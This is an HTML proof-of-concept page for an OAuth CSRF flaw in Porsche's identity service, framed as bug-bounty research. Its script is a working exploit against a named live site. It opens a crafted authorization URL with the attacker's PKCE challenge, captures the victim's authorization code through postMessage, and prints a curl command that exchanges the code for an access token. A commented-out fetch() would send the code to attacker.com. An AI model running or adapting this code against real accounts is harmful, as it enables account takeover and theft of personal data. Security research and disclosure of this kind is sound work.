<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Porsche OAuth CSRF - Live PoC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 800px;
            width: 100%;
            padding: 40px;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
        }
        
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 30px;
            border-radius: 4px;
        }
        
        .warning-box strong {
            color: #856404;
            display: block;
            margin-bottom: 5px;
        }
        
        .warning-box p {
            color: #856404;
            margin: 0;
            font-size: 14px;
        }
        
        #status {
            background: #e3f2fd;
            border-left: 4px solid #2196F3;
            padding: 20px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        
        #status h2 {
            color: #1976D2;
            margin-bottom: 10px;
            font-size: 20px;
        }
        
        #status p {
            color: #1565C0;
            margin: 5px 0;
        }
        
        .attack-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
            margin: 20px 0;
        }
        
        .attack-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
        
        .attack-button:active {
            transform: translateY(0);
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2196F3;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        #result {
            display: none;
        }
        
        .success-box {
            background: #d4edda;
            border-left: 4px solid #28a745;
            padding: 20px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        
        .success-box h2 {
            color: #155724;
            margin-bottom: 15px;
            font-size: 22px;
        }
        
        .success-box h2::before {
            content: "‚úÖ ";
        }
        
        .code-display {
            background: #f8f9fa;
            border: 2px solid #28a745;
            border-radius: 6px;
            padding: 15px;
            margin: 15px 0;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #333;
            line-height: 1.6;
        }
        
        .impact-section {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 20px;
            border-radius: 4px;
            margin: 20px 0;
        }
        
        .impact-section h3 {
            color: #721c24;
            margin-bottom: 15px;
            font-size: 18px;
        }
        
        .impact-section ol {
            color: #721c24;
            margin-left: 20px;
        }
        
        .impact-section li {
            margin: 8px 0;
        }
        
        .technical-details {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 6px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .technical-details h3 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 18px;
        }
        
        .technical-details pre {
            background: #ffffff;
            border: 1px solid #ced4da;
            border-radius: 4px;
            padding: 15px;
            overflow-x: auto;
            font-size: 12px;
            line-height: 1.5;
        }
        
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #dee2e6;
            color: #6c757d;
            font-size: 14px;
            text-align: center;
        }
        
        .error-box {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 20px;
            border-radius: 4px;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê Porsche OAuth CSRF Vulnerability</h1>
        <p class="subtitle">Live Proof of Concept Demonstration</p>
        
        <div class="warning-box">
            <strong>‚ö†Ô∏è Security Research Demonstration</strong>
            <p>This page demonstrates a Cross-Site Request Forgery (CSRF) vulnerability in identity.porsche.com's OAuth implementation. Your authorization code will be captured and displayed below.</p>
        </div>

        <div id="status">
            <h2>üìã Instructions</h2>
            <p>1. Make sure you're logged into <strong>profile.porsche.com</strong> in another tab</p>
            <p>2. Click the button below to trigger the CSRF attack</p>
            <p>3. A popup will open briefly and capture your authorization code</p>
            
            <button id="attackBtn" class="attack-button">üöÄ Start CSRF Attack</button>
            
            <div id="waiting" style="display:none; margin-top: 20px;">
                <p style="color: #1976D2; font-weight: bold;">‚è≥ Waiting for authorization response...</p>
                <div class="spinner"></div>
            </div>
        </div>

        <div id="result">
            <div class="success-box">
                <h2>Authorization Code Successfully Captured!</h2>
                <p><strong>Victim's Authorization Code:</strong></p>
                <div class="code-display" id="code"></div>
            </div>
            
            <div class="impact-section">
                <h3>üéØ Attack Impact</h3>
                <p>With this captured authorization code, an attacker can now:</p>
                <ol>
                    <li><strong>Exchange the code</strong> for a valid access token using their own code_verifier</li>
                    <li><strong>Obtain full account access</strong> to the victim's Porsche account</li>
                    <li><strong>Retrieve sensitive PII</strong> including:
                        <ul>
                            <li>Full name</li>
                            <li>Email address</li>
                            <li>Date of birth</li>
                            <li>Complete home address</li>
                            <li>Phone number</li>
                        </ul>
                    </li>
                    <li><strong>Perform account actions</strong> as the victim</li>
                </ol>
            </div>
            
            <div class="technical-details">
                <h3>üîß Technical Details</h3>
                <pre id="details"></pre>
            </div>
            
            <div class="technical-details">
                <h3>üêõ Vulnerability Explanation</h3>
                <p style="color: #495057; line-height: 1.6; margin-bottom: 15px;">
                    The vulnerability exists because <code>identity.porsche.com</code> accepts OAuth authorization requests 
                    <strong>without validating the state parameter</strong>. This allows an attacker to craft a malicious 
                    OAuth URL with their own <code>code_challenge</code>, trick a victim into clicking it, and receive 
                    an authorization code for the victim's account that can be exchanged using the attacker's 
                    <code>code_verifier</code>.
                </p>
                <p style="color: #495057; line-height: 1.6;">
                    <strong>Root Cause:</strong> Missing OAuth state parameter validation (RFC 6749 Section 10.12)
                </p>
            </div>
        </div>

        <div class="footer">
            <p>Security Research by JobiOne | HackerOne Bug Bounty Program</p>
            <p>Reported to Porsche via Responsible Disclosure</p>
        </div>
    </div>

    <script>
        // ===================================================================
        // ATTACKER'S PKCE CREDENTIALS (Fresh from Account A)
        // ===================================================================
        const ATTACKER_CODE_CHALLENGE = 'GmeSLfiYZdoWUq5uT-pDo2SG2oSdA2inWl0wCZagQT8';
        const ATTACKER_CODE_VERIFIER = 'hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR';
        const ATTACKER_NONCE = 'LivePoC_' + Date.now();
        
        console.log('=== PORSCHE OAUTH CSRF POC ===');
        console.log('Attacker Code Challenge:', ATTACKER_CODE_CHALLENGE);
        console.log('Attacker Code Verifier:', ATTACKER_CODE_VERIFIER);
        console.log('Attacker Nonce:', ATTACKER_NONCE);
        
        // ===================================================================
        // BUILD MALICIOUS OAUTH URL (NO STATE PARAMETER - THIS IS THE BUG!)
        // ===================================================================
        const authUrl = 'https://identity.porsche.com/authorize?' +
            'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB&' +
            'scope=openid+email+profile&' +
            'redirect_uri=https://profile.porsche.com/myprofile/auth/callback&' +
            'audience=https://api.porsche.com&' +
            'response_type=code&' +
            'response_mode=web_message&' +
            'nonce=' + ATTACKER_NONCE + '&' +
            'code_challenge=' + ATTACKER_CODE_CHALLENGE + '&' +
            'code_challenge_method=S256&' +
            'auth0Client=eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==';
        
        console.log('Malicious OAuth URL:', authUrl);
        console.log('NOTE: No state parameter present - this is the CSRF vulnerability!');
        
        let popup;
        
        // ===================================================================
        // BUTTON CLICK HANDLER
        // ===================================================================
        document.getElementById('attackBtn').addEventListener('click', function() {
            console.log('Attack button clicked - opening popup');
            
            // Hide button, show waiting message
            document.getElementById('attackBtn').style.display = 'none';
            document.getElementById('waiting').style.display = 'block';
            
            try {
                popup = window.open(authUrl, 'oauth_popup', 'width=500,height=600,left=100,top=100');
                console.log('Popup opened successfully');
                
                if (!popup) {
                    throw new Error('Popup blocked');
                }
            } catch (e) {
                console.error('Failed to open popup:', e);
                document.getElementById('status').innerHTML = 
                    '<div class="error-box"><strong>‚ùå Popup Blocked</strong>' +
                    '<p>Please allow popups for this site in your browser settings and try again.</p></div>';
            }
        });

        // ===================================================================
        // LISTEN FOR AUTHORIZATION RESPONSE VIA POSTMESSAGE
        // ===================================================================
        window.addEventListener('message', function(event) {
            console.log('Received postMessage event:', event);
            console.log('Event origin:', event.origin);
            console.log('Event data:', event.data);
            
            // Check if message is from Porsche OAuth server or callback
            if (event.origin === 'https://identity.porsche.com' || 
                event.origin === 'https://profile.porsche.com') {
                
                console.log('Message from Porsche domain - processing...');
                
                // Check for authorization response
                if (event.data && event.data.type === 'authorization_response') {
                    const code = event.data.response.code;
                    
                    console.log('üéâ SUCCESS! Authorization code captured:', code);
                    
                    // Display the captured code
                    document.getElementById('status').style.display = 'none';
                    document.getElementById('result').style.display = 'block';
                    document.getElementById('code').textContent = code;
                    
                    // Show technical details
                    const details = {
                        'üîë Captured Authorization Code': code,
                        'üë§ Victim Account': event.data.response.sub || 'Unknown (will be revealed during token exchange)',
                        'üîê Attacker Code Challenge': ATTACKER_CODE_CHALLENGE,
                        'üîì Attacker Code Verifier': ATTACKER_CODE_VERIFIER,
                        'üé≤ Attacker Nonce': ATTACKER_NONCE,
                        '‚è∞ Timestamp': new Date().toISOString(),
                        '‚ö†Ô∏è Vulnerability': 'Missing OAuth state parameter validation',
                        'üìã Next Steps': 'Attacker can now exchange this code with their verifier to obtain victim\'s access token'
                    };
                    
                    document.getElementById('details').textContent = JSON.stringify(details, null, 2);
                    
                    // Log for manual token exchange
                    console.log('\n=== TOKEN EXCHANGE COMMAND ===');
                    console.log('Use this curl command to exchange the code:');
                    console.log(`
curl -X POST 'https://identity.porsche.com/oauth/token' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Auth0-Client: eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==' \\
  -d 'grant_type=authorization_code' \\
  -d 'code=${code}' \\
  -d 'code_verifier=${ATTACKER_CODE_VERIFIER}' \\
  -d 'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB' \\
  -d 'redirect_uri=https://profile.porsche.com/myprofile/auth/callback'
                    `);
                    
                    // In a real attack, this would be sent to attacker's server
                    // fetch('https://attacker.com/capture', {
                    //     method: 'POST',
                    //     headers: { 'Content-Type': 'application/json' },
                    //     body: JSON.stringify({ code: code, timestamp: new Date().toISOString() })
                    // });
                    
                    // Close the popup
                    if (popup && !popup.closed) {
                        setTimeout(() => popup.close(), 1000);
                    }
                }
            }
        }, false);
        
        // Log page load
        console.log('PoC page loaded and ready');
        console.log('Click the button to start the attack');
    </script>
</body>
</html>
